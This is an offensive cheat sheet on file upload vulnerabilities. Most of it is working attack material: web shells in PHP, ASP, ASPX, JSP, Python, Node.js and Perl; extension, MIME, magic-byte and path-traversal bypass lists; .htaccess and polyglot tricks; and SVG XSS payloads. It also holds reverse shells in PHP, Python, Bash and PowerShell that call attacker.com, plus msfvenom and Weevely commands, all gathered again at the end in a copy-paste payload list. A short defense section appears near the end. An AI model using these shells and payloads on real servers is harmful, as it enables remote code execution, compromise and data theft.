# FILE UPLOAD VULNERABILITIES COMPLETE CHEAT SHEET

## 1. WHAT IS FILE UPLOAD VULNERABILITY?

**File Upload Vulnerability** occurs when an application allows users to upload files to the server without proper validation of file type, content, size, or destination. Attackers can upload malicious files (web shells, malware) that lead to:

- **Remote Code Execution (RCE)** via web shells
- **Server compromise** via reverse shells
- **Defacement** of the website
- **Data theft** and lateral movement
- **Denial of Service** (filling disk space)
- **Client-side attacks** (stored XSS via SVG/HTML)

**Key fact:** It is in the **OWASP Top 10** (A04:2021 – Insecure Design, and A05:2021 – Security Misconfiguration).

---

## 2. TYPES OF FILE UPLOAD VULNERABILITIES

| Type | Description |
|------|-------------|
| **Unrestricted Upload** | No validation at all; any file type is accepted. |
| **Client-Side Only Validation** | Validation only in JavaScript; bypass with Burp/proxy. |
| **Blacklist Bypass** | Server blocks certain extensions but not all. |
| **Whitelist Bypass** | Server allows specific extensions; bypass via tricks. |
| **Content-Type Bypass** | Server checks MIME type; spoof with `Content-Type` header. |
| **Magic Byte Bypass** | Server checks file signature; prepend valid magic bytes. |
| **Path Traversal** | Upload filename contains `../` to write outside the intended directory. |
| **Race Condition** | Upload file, execute before validation removes it. |

---

## 3. BASIC DETECTION PAYLOADS

### 3.1 Minimal Web Shells by Language

**PHP:**
```
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo exec($_GET['cmd']); ?>
<?php $c=$_GET['c']; system($c); ?>
<?=`$_GET[0]`;?>
```

**ASP / ASPX:**
```
<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>
<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["c"]); %>
```

**JSP:**
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

**Python:**
```
import os; os.system(request.args.get('cmd'))
```

**Node.js:**
```
require('child_process').exec(req.query.cmd, (e,o) => res.send(o))
```

**Perl:**
```
#!/usr/bin/perl
print `$ENV{QUERY_STRING}`;
```

### 3.2 Minimal Test Uploads
```
test.txt
test.jpg
test.png
test.php
test.php.jpg
test.jpg.php
test.phtml
test.pht
test.phar
test.php5
test.php7
test.phps
test.asp
test.aspx
test.jsp
test.jspx
test.sh
test.svg
test.html
test.htm
test.xml
```

---

## 4. EXTENSION BYPASS TECHNIQUES

### 4.1 Alternative PHP Extensions
If `.php` is blocked, try:
```
.php
.php3
.php4
.php5
.php7
.phtml
.pht
.phar
.phps
.pgif
.inc
.php.jpg
.php.png
.php.gif
.php%00.jpg
.php;.jpg
.php::$DATA
.php/
.php\
.php.
.php%20
.php%0a
.php%0d%0a
```

### 4.2 Alternative ASP/ASPX Extensions
```
.asp
.aspx
.ashx
.asmx
.ascx
.cer
.asa
.asax
.config
```

### 4.3 Alternative JSP Extensions
```
.jsp
.jspx
.jspf
.jsw
.jsv
.jspa
```

### 4.4 Windows-Specific Bypasses

**Using `::$DATA` (NTFS Alternate Data Streams):**
```
shell.php::$DATA
shell.asp::$DATA
shell.aspx::$DATA
```

**Using trailing dots and spaces:**
```
shell.php.
shell.php...
shell.php 
shell.php%20
shell.php%00
```

**Using semicolon (IIS):**
```
shell.asp;.jpg
shell.php;.jpg
```

### 4.5 Double Extensions
```
shell.php.jpg
shell.jpg.php
shell.php.png
shell.php.gif
shell.txt.php
shell.html.php
```

### 4.6 Case Manipulation
```
shell.PHP
shell.Php
shell.pHp
shell.PhP
shell.ASP
shell.AspX
shell.JSP
```

### 4.7 Null Byte Injection (PHP < 5.3.4)
```
shell.php%00.jpg
shell.php\0.jpg
shell.php%00.png
shell.asp%00.jpg
```

### 4.8 Double URL Encoding
```
shell%252ephp
shell%252ephp%252ejpg
```

### 4.9 Content-Type Bypass

Set the `Content-Type` header to a legitimate image type:
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/bmp
Content-Type: text/plain
Content-Type: application/octet-stream
```

### 4.10 Magic Bytes / File Signature

Prepend valid file signatures to trick MIME validators:

**JPEG:**
```
FF D8 FF E0
```
Example:
```
GIF89a; <?php system($_GET['cmd']); ?>
```

**PNG:**
```
89 50 4E 47 0D 0A 1A 0A
```

**GIF:**
```
GIF87a
GIF89a
```

**PDF:**
```
%PDF-1.4
```

**ZIP/DOCX:**
```
PK\x03\x04
```

**BMP:**
```
BM
```

**Full example (GIF + PHP):**
```
GIF89a; <?php system($_GET['cmd']); ?>
```

**Full example (JPEG + PHP):**
```
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>
```

---

## 5. FILENAME MANIPULATION TECHNIQUES

### 5.1 Path Traversal in Filename
```
../../../../var/www/html/shell.php
..\..\..\..\inetpub\wwwroot\shell.aspx
../../../../tmp/shell.php
../../../shell.php
..%2f..%2f..%2fshell.php
%2e%2e%2f%2e%2e%2f%2e%2e%2fshell.php
....//....//....//shell.php
```

### 5.2 Using Different Directory
```
uploads/shell.php
../uploads/shell.php
/uploads/shell.php
```

### 5.3 Filename Encoding
```
shell%2Ephp
shell%2ephp
shell.%70%68%70
shell%70%68%70
```

---

## 6. CONTENT-TYPE / MIME HEADERS TO SPOOF

```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/svg+xml
Content-Type: text/plain
Content-Type: text/html
Content-Type: application/octet-stream
Content-Type: application/x-php
Content-Type: application/x-httpd-php
Content-Type: application/x-msdownload
```

---

## 7. WEB SHELL PAYLOADS (MORE ADVANCED)

### 7.1 PHP Simple Shell
```
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo `{$_GET['cmd']}`; ?>
<?php $a=$_GET['a']; echo `$a`; ?>
```

### 7.2 PHP with Base64 Password
```
<?php if(isset($_GET['pw']) && $_GET['pw']=='secret'){ system($_GET['cmd']); } ?>
```

### 7.3 PHP Upload Bypass via .htaccess

**Step 1 – Upload `.htaccess`:**
```
AddType application/x-httpd-php .jpg
```

**Step 2 – Upload `shell.jpg` with PHP code:**
```
<?php system($_GET['cmd']); ?>
```

Now `shell.jpg` executes as PHP.

**Alternative `.htaccess`:**
```
SetHandler application/x-httpd-php
```

**For Apache 2.4+ with `mod_php`:**
```
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

### 7.4 PHP via `php.ini` (rare)
```
auto_prepend_file=shell.jpg
```

### 7.5 PHP with Image Header
```
GIF89a
<?php system($_GET['cmd']); ?>
```

### 7.6 ASPX Shell
```
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
</script>
```

### 7.7 JSP Shell
```
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null){
        Process p = Runtime.getRuntime().exec(cmd);
        java.io.InputStream is = p.getInputStream();
        int a;
        while((a = is.read()) != -1) out.print((char)a);
    }
%>
```

### 7.8 SVG XSS Payload
```
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

Or:
```
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
```

### 7.9 HTML File with XSS
```
<html><body><script>alert(document.domain)</script></body></html>
```

---

## 8. BYPASS WAF / FILTERS

### 8.1 Case Variation
```
shell.PHP
shell.PHp
shell.pHp
```

### 8.2 Multiple Extensions
```
shell.php.jpg
shell.jpg.php
shell.php.jpg.png
shell.php.txt
```

### 8.3 Special Characters
```
shell.php%00.jpg
shell.php;.jpg
shell.php:.jpg
shell.php .jpg
shell.php..jpg
shell.php::$DATA
shell.php/
shell.php\
```

### 8.4 Encoding
```
shell%2ephp
shell%252ephp
shell%c0%ae%c0%aephp
shell%c0%2e%c0%2ephp
```

### 8.5 Using `Content-Type` + Magic Bytes Together
Upload a PHP file with:
- Header: `Content-Type: image/jpeg`
- Body begins with: `GIF89a` or `FF D8 FF E0`

### 8.6 Polyglot Files
A file that is a valid image AND valid PHP/JS:
```
GIF89a/*<?php system($_GET['cmd']); ?>*/;
```

Or a JPEG+PHP polyglot generated by tools like `jphide` or manual crafting.

### 8.7 Filename Length Bypass
Exceed the truncation limit (Windows 255, Linux 255):
```
shell.php......................................................................
```
Truncated to `shell.php` in some legacy systems.

### 8.8 Race Condition
1. Upload file.
2. Execute immediately before validation removes it.
3. Use Burp Turbo Intruder for concurrent requests.

---

## 9. OOB / BLIND UPLOAD DETECTION

If you can't see if the upload succeeded:
- Request the uploaded file path directly: `/uploads/shell.php`
- Use Burp Collaborator or Interactsh:
```
<?php file_get_contents('http://attacker.burpcollaborator.net/'); ?>
```
- Use a reverse shell payload:
```
<?php system('bash -i >& /dev/tcp/attacker.com/4444 0>&1'); ?>
```

---

## 10. REVERSE SHELLS VIA UPLOAD

### 10.1 PHP Reverse Shell
```
<?php
$sock = fsockopen("attacker.com", 4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

### 10.2 Python Reverse Shell
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

### 10.3 Bash Reverse Shell (via uploaded .sh)
```
#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

### 10.4 PowerShell Reverse Shell (uploaded .ps1)
```
$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

---

## 11. UPLOAD VIA DIFFERENT VECTORS

- **Multipart form data:** standard
- **Base64 in JSON body:** `{"file":"<base64>"}`
- **PUT request:** `PUT /uploads/shell.php`
- **WebDAV:** `PUT` with `Content-Type: application/x-php`
- **Chunked uploads:** split malicious payload across chunks
- **ZIP upload + extraction:** upload `.zip` and extract server-side (Zip Slip)

---

## 12. TOOLS

| Tool | Usage |
|------|-------|
| **Burp Suite** | Manual testing, Intruder for fuzzing extensions. |
| **Fuxploider** | Automated file upload vulnerability scanner. |
| **UploadScanner (Burp Extension)** | Automated upload testing. |
| **Weevely** | PHP web shell with stealth features. |
| **msfvenom** | Generate reverse shell payloads. |
| **PayloadsAllTheThings** | File upload payloads. |
| **HackTricks** | Complete guide. |
| **Interactsh** | OOB detection. |

**Commands:**
```bash
# msfvenom PHP reverse shell
msfvenom -p php/meterpreter_reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php

# Fuxploider
python3 fuxploider.py --url http://victim.com/upload --not-regex "wrong file type"

# Weevely
weevely generate secret shell.php
```

---

## 13. DEFENSE / PREVENTION

| Rule | Explanation |
|------|-------------|
| **1. Whitelist extensions** | Allow only `.jpg`, `.png`, `.pdf` (or whatever is needed). |
| **2. Validate MIME type** | Check the actual file content, not just the header. |
| **3. Rename files** | Generate random filenames, discard user input. |
| **4. Store outside webroot** | Never serve uploaded files directly from the webroot. |
| **5. Disable execution** | Configure the web server to not execute files in upload directories. |
| **6. Limit file size** | Prevent DoS. |
| **7. Validate magic bytes** | Check the file signature. |
| **8. Use antivirus scanning** | Scan uploads with ClamAV or similar. |
| **9. Content-Disposition header** | Force download instead of inline rendering. |
| **10. Isolate upload directory** | Separate domain or subdomain with no cookies. |
| **11. Reject double extensions** | Reject `.php.jpg`, `.php.png`, etc. |
| **12. Strip EXIF metadata** | Prevent XSS via SVG. |
| **13. WAF and RASP** | Use rules to detect common upload attacks. |

**Apache config example (disable PHP in uploads):**
```
<Directory "/var/www/uploads">
    php_flag engine off
    Options -ExecCGI
</Directory>
```

**Nginx config example:**
```
location /uploads/ {
    location ~ \.php$ { return 403; }
}
```

---

## 14. TIPS FOR TESTING

1. Identify any upload functionality (avatar, document, image, file manager).
2. Start with a benign file to observe behavior (where it's stored, name, URL).
3. Try uploading a simple `.txt` file, then `.php`, `.asp`, `.jsp`.
4. If blocked, try alternative extensions and double extensions.
5. Spoof `Content-Type` to `image/jpeg`.
6. Add magic bytes (`GIF89a`, `FF D8 FF E0`).
7. Try case variation and URL encoding.
8. Test path traversal in the filename.
9. Try uploading a `.htaccess` file to change execution behavior.
10. If successful, upload a web shell and obtain RCE.
11. Test for race conditions with concurrent uploads.
12. Always test on your own account first.

---

## 15. QUICK REFERENCE – EXTENSIONS TO TRY

| Language | Extensions |
|----------|------------|
| PHP | `.php`, `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.pht`, `.phar`, `.phps`, `.pgif`, `.inc` |
| ASP | `.asp`, `.aspx`, `.ashx`, `.asmx`, `.ascx`, `.cer`, `.asa`, `.asax`, `.config` |
| JSP | `.jsp`, `.jspx`, `.jspf`, `.jsw`, `.jsv`, `.jspa` |
| Python | `.py`, `.pyc`, `.pth` |
| Ruby | `.rb`, `.erb` |
| Perl | `.pl`, `.cgi` |
| Node.js | `.js`, `.mjs` |
| Client-side | `.svg`, `.html`, `.htm`, `.xml`, `.xhtml` |
| Shell | `.sh`, `.bash`, `.zsh` |

---

## ALL IN ONE JUST FOR COPY PASTE AND USE IN A TXT FILE

```
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo passthru($_GET['cmd']); ?>
<?php echo exec($_GET['cmd']); ?>
<?php $c=$_GET['c']; system($c); ?>
<?=`$_GET[0]`;?>
<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>
<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["c"]); %>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
import os; os.system(request.args.get('cmd'))
require('child_process').exec(req.query.cmd, (e,o) => res.send(o))
#!/usr/bin/perl
print `$ENV{QUERY_STRING}`;
test.txt
test.jpg
test.png
test.php
test.php.jpg
test.jpg.php
test.phtml
test.pht
test.phar
test.php5
test.php7
test.phps
test.asp
test.aspx
test.jsp
test.jspx
test.sh
test.svg
test.html
test.htm
test.xml
.php
.php3
.php4
.php5
.php7
.phtml
.pht
.phar
.phps
.pgif
.inc
.php.jpg
.php.png
.php.gif
.php%00.jpg
.php;.jpg
.php::$DATA
.php/
.php\
.php.
.php%20
.php%0a
.php%0d%0a
.asp
.aspx
.ashx
.asmx
.ascx
.cer
.asa
.asax
.config
.jsp
.jspx
.jspf
.jsw
.jsv
.jspa
shell.php::$DATA
shell.asp::$DATA
shell.aspx::$DATA
shell.php.
shell.php...
shell.php 
shell.php%20
shell.php%00
shell.asp;.jpg
shell.php;.jpg
shell.php.jpg
shell.jpg.php
shell.php.png
shell.php.gif
shell.txt.php
shell.html.php
shell.PHP
shell.Php
shell.pHp
shell.PhP
shell.ASP
shell.AspX
shell.JSP
shell.php%00.jpg
shell.php\0.jpg
shell.php%00.png
shell.asp%00.jpg
shell%252ephp
shell%252ephp%252ejpg
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: image/bmp
Content-Type: text/plain
Content-Type: application/octet-stream
GIF89a; <?php system($_GET['cmd']); ?>
GIF87a
GIF89a
%PDF-1.4
PK\x03\x04
BM
../../../../var/www/html/shell.php
..\..\..\..\inetpub\wwwroot\shell.aspx
../../../../tmp/shell.php
../../../shell.php
..%2f..%2f..%2fshell.php
%2e%2e%2f%2e%2e%2f%2e%2e%2fshell.php
....//....//....//shell.php
uploads/shell.php
../uploads/shell.php
/uploads/shell.php
shell%2Ephp
shell%2ephp
shell.%70%68%70
shell%70%68%70
Content-Type: application/x-php
Content-Type: application/x-httpd-php
Content-Type: application/x-msdownload
AddType application/x-httpd-php .jpg
SetHandler application/x-httpd-php
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
auto_prepend_file=shell.jpg
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
</script>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null){
        Process p = Runtime.getRuntime().exec(cmd);
        java.io.InputStream is = p.getInputStream();
        int a;
        while((a = is.read()) != -1) out.print((char)a);
    }
%>
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
<html><body><script>alert(document.domain)</script></body></html>
shell.PHP
shell.PHp
shell.pHp
shell.php.jpg
shell.jpg.php
shell.php.jpg.png
shell.php.txt
shell.php%00.jpg
shell.php;.jpg
shell.php:.jpg
shell.php .jpg
shell.php..jpg
shell.php::$DATA
shell.php/
shell.php\
shell%2ephp
shell%252ephp
shell%c0%ae%c0%aephp
shell%c0%2e%c0%2ephp
GIF89a/*<?php system($_GET['cmd']); ?>*/;
shell.php......................................................................
<?php file_get_contents('http://attacker.burpcollaborator.net/'); ?>
<?php system('bash -i >& /dev/tcp/attacker.com/4444 0>&1'); ?>
<?php
$sock = fsockopen("attacker.com", 4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker.com",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
#!/bin/bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
msfvenom -p php/meterpreter_reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
python3 fuxploider.py --url http://victim.com/upload --not-regex "wrong file type"
weevely generate secret shell.php
```
